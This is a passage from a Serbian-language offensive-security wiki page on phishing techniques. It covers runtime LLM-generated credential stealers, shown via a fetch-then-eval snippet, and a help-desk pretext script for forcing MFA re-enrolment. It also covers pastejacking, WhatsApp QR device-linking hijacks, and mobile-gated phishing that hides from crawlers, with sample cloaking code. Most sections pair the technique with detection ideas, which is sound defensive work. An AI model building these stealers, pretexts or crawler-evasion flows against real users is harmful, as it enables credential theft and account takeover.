.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generisani kod personalizuje mamac (npr. parsiranje LogoKit tokena) i šalje creds na endpoint skriven u promptu.

**Osobine zaobilaženja**
- Saobraćaj prolazi kroz dobro poznate LLM domene ili pouzdane CDN proxy-je; ponekad putem WebSockets-a do backend-a.
- Nema statičkog payload-a; malicious JS postoji tek nakon renderovanja.
- Nedeterminističke generacije proizvode **jedinstvene stealere** po sesiji.

**Ideje za detekciju**
- Pokrenite sandbox-e sa omogućenim JS-om; označite **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Tražite front-end POST zahteve ka LLM API-jima neposredno praćene pozivom `eval`/`Function` nad vraćenim tekstom.
- Upozorite na neodobrene LLM domene u klijentskom saobraćaju, praćene naknadnim slanjem kredencijala POST zahtevom.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Pored klasičnog push-bombing-a, operateri tokom poziva help-desku jednostavno **forsiraju novu MFA registraciju**, čime poništavaju postojeći token korisnika. Svaki naredni prompt za prijavljivanje žrtvi deluje legitimno.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Pratite AzureAD/AWS/Okta događaje u kojima se **`deleteMFA` + `addMFA`** dešavaju u razmaku od nekoliko minuta sa iste IP adrese.



## Clipboard Hijacking / Pastejacking

Napadači mogu neprimetno kopirati zlonamerne komande u clipboard žrtve sa kompromitovane ili typosquatted web stranice, a zatim navesti korisnika da ih nalepi u **Win + R**, **Win + X** ili prozor terminala, čime se izvršava proizvoljan kod bez ikakvog download-a ili attachment-a.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Lure stranica (npr. lažni “channel” ministarstva/CERT-a) prikazuje WhatsApp Web/Desktop QR i daje žrtvi instrukcije da ga skenira, čime se napadač neprimetno dodaje kao **linked device**.<sup>[[10]](#references)</sup>
* Napadač odmah dobija uvid u chatove i kontakte sve dok se sesija ne ukloni. Žrtve kasnije mogu videti obaveštenje “new device linked”; defanzivci mogu tražiti neočekivane device-link događaje ubrzo nakon poseta nepouzdanim QR stranicama.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operateri sve češće ograničavaju phishing tokove na osnovu jednostavne provere uređaja, tako da desktop crawleri nikada ne dođu do završnih stranica. Uobičajen obrazac je mala skripta koja proverava da li DOM podržava touch i šalje rezultat server endpoint-u; non-mobile klijenti dobijaju HTTP 500 (ili praznu stranicu), dok se mobilnim korisnicima prikazuje kompletan tok.<sup>[[6]](#references)</sup>

Minimalni client snippet (tipična logika):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logika (pojednostavljeno):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Ponašanje servera koje se često uočava:
- Postavlja session cookie tokom prvog učitavanja.
- Prihvata `POST /detect {"is_mobile":true|false}`.
- Vraća 500 (ili placeholder) pri narednim GET zahtevima kada je `is_mobile=false`; prikazuje phishing samo ako je `true`.

Heuristike za pretragu i detekciju:
- urlscan upit: `filename:"detect_device.js" AND page.status:500`
- Web telemetrija: sekvenca `GET /static/detect_device.js` → `POST /detect` → HTTP 500 za non-mobile; legitimne putanje mobilnih žrtava vraćaju 200, nakon čega slede HTML/JS.
- Blokirajte ili detaljno proverite stranice koje sadržaj uslovljavaju isključivo na osnovu `ontouchstart` ili sličnih provera uređaja.

Saveti za odbranu:
- Pokrećite crawlers sa fingerprintovima nalik mobilnim uređajima i omogućenim JS-om kako biste otkrili ograničeni sadržaj.
- Postavite alert za sumnjive 500 odgovore nakon `POST /detect` na novoregistrovanim domenima.

## Reference

- [1] [Generisanje varijacija domena koje se koriste u phishingu (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Pronalaženje phishinga: alati i tehnike (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Krađa sessiona i zaobilaženje 2FA pomoću EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [4] [Kako instalirati i konfigurisati DKIM sa Postfixom na Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [5] [Globalni izveštaj Unit 42 o incident response-u za 2025. – izdanje o socijalnom inženjeringu](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [6] [Silent Smishing – phishing infrastruktura ograničena na mobilne uređaje i heuristike (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [7] [Sledeća granica napada sklapanjem tokom izvršavanja: korišćenje LLM-ova za generisanje phishing JavaScripta u realnom vremenu](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [8] [Impersonation, otmica klikova i TDS: analiza ekosistema za distribuciju malwarea](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [9] [Preusmeravanje saobraćaja ka Microsoftovom windows.com pomoću bit flippinga (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [10] [Ljubav? Zapravo: lažna dating aplikacija korišćena kao mamac u ciljanoj spyware kampanji u Pakistanu](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [11] [ESET GhostChat IoC-ovi i uzorci](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
